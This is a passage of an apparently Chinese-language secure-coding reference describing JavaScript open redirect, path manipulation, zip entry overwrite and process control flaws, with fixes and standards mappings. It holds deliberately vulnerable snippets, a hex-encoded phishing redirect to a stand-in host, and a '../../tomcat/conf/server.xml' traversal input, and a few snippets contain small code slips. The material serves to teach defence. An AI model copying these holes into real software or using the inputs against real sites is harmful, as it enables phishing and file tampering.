<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Open-Redirect"><a href="#Open-Redirect" class="headerlink" title="Open Redirect"></a>Open Redirect</h4><h5 id="ABSTRACT-36"><a href="#ABSTRACT-36" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果允许未验证的输入控制重定向机制所使用的 URL，可能会有利于攻击者发动钓鱼攻击。</p>
<h5 id="EXPLANATION-36"><a href="#EXPLANATION-36" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>通过重定向，Web 应用程序能够引导用户访问同一应用程序内的不同网页或访问外部站点。应用程序利用重定向来帮助进行站点导航，有时还跟踪用户退出站点的方式。当 Web 应用程序将客户端重定向到攻击者可以控制的任意 URL 时，就会发生 Open redirect 漏洞：</p>
<p>攻击者可以利用 Open redirect 漏洞诱骗用户访问某个可信赖站点的 URL，并将他们重定向到恶意站点。攻击者通过对 URL 进行编码，使最终用户很难注意到重定向的恶意目标，即使将这一目标作为 URL 参数传递给可信赖的站点时也会发生这种情况。因此，Open redirect 常被作为钓鱼手段的一种而滥用，攻击者通过这种方式来获取最终用户的敏感数据。</p>
<p>示例 1：以下 JavaScript 代码会在用户打开链接时，指示用户浏览器打开从 dest 请求参数中读取的 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">strDest = form.dest.value;</span><br><span class="line"></span><br><span class="line">window.open(strDest,&quot;myresults&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果受害者收到一封电子邮件，指示其打开“<a href="http://trusted.example.com/ecommerce/redirect.asp?dest=www.wilyhacker.com”链接，该用户就有可能会单击该链接，因为他会认为该链接会转到可信赖的站点。然而，当受害者单击该链接时，Example" target="_blank" rel="noopener">http://trusted.example.com/ecommerce/redirect.asp?dest=www.wilyhacker.com”链接，该用户就有可能会单击该链接，因为他会认为该链接会转到可信赖的站点。然而，当受害者单击该链接时，Example</a> 1 中的代码就会将浏览器重定向到“<a href="http://www.wilyhacker.com”。" target="_blank" rel="noopener">http://www.wilyhacker.com”。</a></p>
<p>很多用户都被告知，要始终监视通过电子邮件收到的 URL，以确保链接指向一个他们所熟知的可信赖站点。尽管如此，如果攻击者对目标 URL 进行 16 进制编码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;http://trusted.example.com/ecommerce/redirect.asp?dest=%77%69%6C%79%68%61%63%6B%65%72%2E%63%6F%6D&quot;</span><br></pre></td></tr></table></figure>
<p>那么，即使再聪明的最终用户也可能会被欺骗，打开该链接。</p>
<h5 id="RECOMMENDATIONS-36"><a href="#RECOMMENDATIONS-36" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不应当允许未验证的用户输入控制重定向机制中的目标 URL。而应采用间接方法：创建一份合法 URL 列表，用户可以指定其中的内容，并且只能从中进行选择。利用这种方法，就绝不会直接使用用户提供的输入来指定要重定向到的 URL。</p>
<p>示例2：以下代码引用了一个通过有效 URL 传播的数组。用户单击的链接将通过与所需 URL 对应的数组索引来传递。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	strDest = form.dest.value;</span><br><span class="line"></span><br><span class="line">	if((strDest.value != null)||(strDest.value.length!=0))</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		if((strDest &gt;= 0) &amp;&amp; (strDest &lt;= strURLArray.length -1 ))</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			strFinalURL = strURLArray[strDest];</span><br><span class="line"></span><br><span class="line">			window.open(strFinalURL,&quot;myresults&quot;);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>但在某些情况下，这种方法并不可行，因为这样一份合法 URL 列表过于庞大、难以跟踪。这种情况下，有一种类似的方法也能限制用于重定向用户的域，这种方法至少可以防止攻击者向用户发送恶意的外部站点。</p>
<h5 id="REFERENCES-36"><a href="#REFERENCES-36" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 601 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[3] Standards Mapping - FIPS200 SI </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.5 Input Validation Requirements </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A10 Unvalidated Redirects and Forwards </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A10 Unvalidated Redirects and Forwards </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[19] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 601 </p>
<p>[20] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 601 </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Web Application Security Consortium 24 + 2 Content Spoofing </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 URL Redirector Abuse (WASC-38) </p>
<h4 id="Path-Manipulation"><a href="#Path-Manipulation" class="headerlink" title="Path Manipulation"></a>Path Manipulation</h4><h5 id="ABSTRACT-37"><a href="#ABSTRACT-37" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>允许用户输入控制文件系统操作所用的路径会导致攻击者能够访问或修改其他受保护的系统资源。</p>
<h5 id="EXPLANATION-37"><a href="#EXPLANATION-37" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当满足以下两个条件时，就会产生 path manipulation 错误：</p>
<p>1.攻击者能够指定某一文件系统操作中所使用的路径。</p>
<ol>
<li>攻击者可以通过指定特定资源来获取某种权限，而这种权限在一般情况下是不可能获得的。</li>
</ol>
<p>例如，在某一程序中，攻击者可以获得特定的权限，以重写指定的文件或是在其控制的配置环境下运行程序。</p>
<p>示例 1：以下代码使用来自于 HTTP 请求的输入来创建一个文件名。程序员没有考虑到攻击者可能使用像“../../tomcat/conf/server.xml”一样的文件名，从而导致应用程序删除它自己的配置文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var reportNameParam = &quot;reportName=&quot;;</span><br><span class="line"></span><br><span class="line">var reportIndex = document.indexOf(reportNameParam); </span><br><span class="line"></span><br><span class="line">if (reportIndex &lt; 0) return; </span><br><span class="line"></span><br><span class="line">var rName = document.URL.substring(reportIndex+reportNameParam.length);</span><br><span class="line"></span><br><span class="line">window.requestFileSystem(window.TEMPORARY, 1024*1024, function(fs) &#123;</span><br><span class="line"></span><br><span class="line">  fs.root.getFile(&apos;/usr/local/apfr/reports/&apos; + rName, &#123;create: false&#125;, function(fileEntry) &#123;</span><br><span class="line"></span><br><span class="line">    fileEntry.remove(function() &#123;</span><br><span class="line"></span><br><span class="line">      console.log(&apos;File removed.&apos;);</span><br><span class="line"></span><br><span class="line">    &#125;, errorHandler);</span><br><span class="line"></span><br><span class="line">  &#125;, errorHandler);</span><br><span class="line"></span><br><span class="line">&#125;, errorHandler);</span><br></pre></td></tr></table></figure>
<p>示例 2：以下代码使用来自于本地存储的输入来决定该打开哪个文件，并返回到用户。如果恶意用户能够更改本地存储的内容，就可以使用该程序来读取系统中扩展名为 .txt 的任何文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var filename = localStorage.sub + &apos;.txt&apos;;</span><br><span class="line"></span><br><span class="line">function oninit(fs) &#123;</span><br><span class="line"></span><br><span class="line">  fs.root.getFile(filename, &#123;&#125;, function(fileEntry) &#123;</span><br><span class="line"></span><br><span class="line">    fileEntry.file(function(file) &#123;</span><br><span class="line"></span><br><span class="line">       var reader = new FileReader();</span><br><span class="line"></span><br><span class="line">       reader.onloadend = function(e) &#123;</span><br><span class="line"></span><br><span class="line">         var txtArea = document.createElement(&apos;textarea&apos;);</span><br><span class="line"></span><br><span class="line">         txtArea.value = this.result;</span><br><span class="line"></span><br><span class="line">         document.body.appendChild(txtArea);</span><br><span class="line"></span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       reader.readAsText(file);</span><br><span class="line"></span><br><span class="line">    &#125;, errorHandler);</span><br><span class="line"></span><br><span class="line">  &#125;, errorHandler);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.requestFileSystem(window.TEMPORARY, 1024*1024, oninit, errorHandler);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-37"><a href="#RECOMMENDATIONS-37" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>防止 Path Manipulation 的最佳方法是采用一些间接手段：创建一个必须由用户选择的合法值的列表。通过这种方法，就不能直接使用用户提供的输入来指定资源名称。</p>
<p>但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大，维护难度过大。因此，在这种情况下，程序员通常会采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。</p>
<h5 id="REFERENCES-37"><a href="#REFERENCES-37" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 22, CWE ID 73 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [10] CWE ID 022 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[7] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[8] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[10] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.2.2 Sanitization and Sandboxing Requirements, 12.3.1 File Execution Requirements, 12.3.2 File Execution Requirements </p>
<p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[12] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[13] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference </p>
<p>[14] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References </p>
<p>[15] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References </p>
<p>[16] Standards Mapping - OWASP Top 10 2017 A5 Broken Access Control </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[24] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[25] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 426 </p>
<p>[26] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 022 </p>
<p>[27] Standards Mapping - SANS Top 25 2011 Risky Resource Management - CWE ID 022 </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[44] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[45] Standards Mapping - Web Application Security Consortium 24 + 2 Path Traversal </p>
<p>[46] Standards Mapping - Web Application Security Consortium Version 2.00 Path Traversal (WASC-33) </p>
<h4 id="Path-Manipulation-Zip-Entry-Overwrite"><a href="#Path-Manipulation-Zip-Entry-Overwrite" class="headerlink" title="Path Manipulation: Zip Entry Overwrite"></a>Path Manipulation: Zip Entry Overwrite</h4><h5 id="ABSTRACT-38"><a href="#ABSTRACT-38" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>允许用户输入控制文件系统操作中使用的路径会导致攻击者能够随意覆盖系统上的文件。</p>
<h5 id="EXPLANATION-38"><a href="#EXPLANATION-38" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Path Manipulation： 在打开和扩展 ZIP 文件但未检查 ZIP 条目的文件路径时，会出现“ZIP 条目覆盖”错误。</p>
<p>示例： 以下示例从 ZIP 文件中提取文件并以非安全方式将其写入磁盘。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var unzipper = require(&apos;unzipper&apos;);</span><br><span class="line"></span><br><span class="line">var fs = require(&apos;fs&apos;);</span><br><span class="line"></span><br><span class="line">var untrusted_zip = getZipFromRequest();</span><br><span class="line"></span><br><span class="line">fs.createReadStream(zipPath).pipe(unzipper.Extract(&#123; path: &apos;out&apos; &#125;));</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-38"><a href="#RECOMMENDATIONS-38" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在解压缩不受信任的 ZIP 文件时，请确保使用安全版本的 ZIP 库（请参见“提示”部分）。</p>
<h5 id="REFERENCES-38"><a href="#REFERENCES-38" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 22, CWE ID 73 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [10] CWE ID 022 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 12.3.1 File Execution Requirements, 12.3.2 File Execution Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A5 Broken Access Control </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 426 </p>
<p>[23] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 022 </p>
<p>[24] Standards Mapping - SANS Top 25 2011 Risky Resource Management - CWE ID 022 </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium 24 + 2 Path Traversal </p>
<p>[43] Standards Mapping - Web Application Security Consortium Version 2.00 Path Traversal (WASC-33) </p>
<h4 id="Process-Control"><a href="#Process-Control" class="headerlink" title="Process Control"></a>Process Control</h4><h5 id="ABSTRACT-39"><a href="#ABSTRACT-39" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>从一个不可信赖的数据源或是不可信赖的环境中加载库，会导致应用程序以攻击者的名义执行恶意代码。</p>
<h5 id="EXPLANATION-39"><a href="#EXPLANATION-39" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Process control 漏洞主要表现为以下两种形式：</p>
<p>— 攻击者可以篡改程序加载的库的名称：攻击者直接地控制库所使用的名称。</p>
<p>— 攻击者可以篡改库加载的环境：攻击者间接控制库名称的含义。</p>
<p>在这种情况下，我们着重关注第一种情况，即攻击者有可能控制加载的库的名称。这种类型的 Process Control 漏洞会在以下情况下出现：</p>
<ol>
<li><p>数据从不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据作为代表应用程序所加载的库的一个或部分字符串使用。</p>
</li>
<li><p>通过在库中执行代码，应用程序授予攻击者在一般情况下无法获得的权限或能力。</p>
</li>
</ol>
<p>示例 1：以下代码使用 Express 当前未记录的“功能”动态加载库文件。然后，Node.js 将继续在其正则库加载路径中搜索包含此库的文件或目录[1]。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">app.get(&apos;/&apos;, function(req, res, next) &#123;</span><br><span class="line"></span><br><span class="line">  res.render(&apos;tutorial/&apos; + req.params.page);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在 Express 中，传递到 Response.render() 的页面将加载先前未知的扩展库。这对于“foo.pug”等输入来说通常没有问题，因为这意味着加载 pug 库，该库是广为人知的模板引擎。但是，如果攻击者可以控制页面并进而控制扩展，那么他们便可以选择加载 Node.js 模块加载路径内的任何库。因为程序不会验证从 URL 参数接收的信息，所以攻击者可能会欺骗应用程序，去执行恶意代码并取得对系统的控制。</p>
<h5 id="RECOMMENDATIONS-39"><a href="#RECOMMENDATIONS-39" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不要允许用户控制由程序加载的库。若加载库的选择一定要涉及用户输入的话，通常情况下，应用程序会期望这个特定的输入是一个很小的数值集合。而不是依赖输入的安全性以及不包含任何恶意信息。因此，应用程序所使用的输入应该仅从一个预先决定的、安全的库的集合中进行选择。如果输入看上去是恶意的，则应该将即将加载的库限制在这一集合的安全数值范围之内，或由程序拒绝继续执行该操作。</p>
